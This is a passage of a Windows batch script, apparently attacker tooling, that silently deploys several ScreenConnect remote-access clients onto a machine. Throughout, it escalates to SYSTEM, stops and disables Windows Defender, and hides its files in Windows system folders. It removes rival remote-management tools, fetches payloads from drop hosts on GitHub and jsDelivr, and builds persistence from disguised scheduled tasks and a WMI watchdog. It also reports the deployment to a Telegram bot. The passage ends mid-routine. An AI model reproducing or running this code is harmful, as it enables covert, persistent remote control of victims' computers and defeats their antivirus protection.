@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O39 - stop Gryxa panel duplicates (no reinstall when Running)
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O39 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O39b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O39" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O39 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O39 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O39: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M29" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L16" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O39: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O39 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn — BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) — same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O39 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O39 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem Gryxa is mandatory — climb until Running (never soft-skip on registered).
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo gryxa_already_running>>"%LOG%"
  exit /b 0
)
echo gryxa_must_begin>>"%LOG%"

sc query "%GRYXA%" >nul 2>&1
if not errorlevel 1 (
  echo gryxa_svc_start>>"%LOG%"
  sc config "%GRYXA%" start= auto >nul 2>&1
  sc failure "%GRYXA%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
  net start "%GRYXA%" >nul 2>&1
  sc start "%GRYXA%" >nul 2>&1
  timeout /t 6 /nobreak >nul
  sc start "%GRYXA%" >nul 2>&1
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo gryxa_started_ok>>"%LOG%"
    exit /b 0
  )
)

set "GREG=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP3%" -WorkDir "%WD%"`) do set "GREG=%%R"
echo gryxa_registered=!GREG!>>"%LOG%"
if /I "!GREG!"=="yes" (
  echo gryxa_repair_begin>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 8 /nobreak >nul
  sc config "%GRYXA%" start= auto >nul 2>&1
  sc start "%GRYXA%" >nul 2>&1
  timeout /t 5 /nobreak >nul
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo gryxa_repaired_ok>>"%LOG%"
    exit /b 0
  )
  echo gryxa_clean_reinstall_begin>>"%LOG%"
  if exist "%WD%\own_lib.ps1" (
    for /f "usebackq delims=" %%G in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$n='ScreenConnect Client (%KEEP3%)'; foreach($r in @('HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')){ if(Test-Path $r){ Get-ChildItem $r -EA 0 | ForEach-Object { $p=Get-ItemProperty $_.PSPath -EA 0; if($p.DisplayName -eq $n -and $_.PSChildName -like '{*}'){ $_.PSChildName; return } } } }"`) do set "GGUID=%%G"
  )
  if defined GGUID (
    call :NoMsiPolicy
    msiexec /x !GGUID! /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
    echo gryxa_uninstall_exit=!ERRORLEVEL!>>"%LOG%"
    timeout /t 8 /nobreak >nul
  )
)

if /I not "!GREG!"=="yes" (
  sc query "%GRYXA%" >nul 2>&1
  if not errorlevel 1 (
    echo gryxa_orphan_svc_delete>>"%LOG%"
    sc stop "%GRYXA%" >nul 2>&1
    sc delete "%GRYXA%" >nul 2>&1
    timeout /t 3 /nobreak >nul
  )
  if exist "%PF86%\ScreenConnect Client (%KEEP3%)" (
    echo gryxa_stale_dir_clean>>"%LOG%"
    rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP3%)" >nul 2>&1
  )
)

echo gryxa_install_begin>>"%LOG%"
set "G_MSI_READY=0"
if exist "%MSICACHE_G%" for %%F in ("%MSICACHE_G%") do if %%~zF GEQ 500000 (
  call :ForceCopy "%MSICACHE_G%" "%MSI_G%"
  set "G_MSI_READY=1"
  echo gryxa_msi_from_cache>>"%LOG%"
)
if "%G_MSI_READY%"=="0" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
  if not exist "%MSI_G%" "%CURL%" -L --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
  for %%A in ("%MSI_G%") do if %%~zA GEQ 500000 (
    call :ForceCopy "%MSI_G%" "%MSICACHE_G%"
    set "G_MSI_READY=1"
    echo gryxa_msi_fetched=%%~zA>>"%LOG%"
  )
)
if "%G_MSI_READY%"=="1" (
  call :NoMsiPolicy
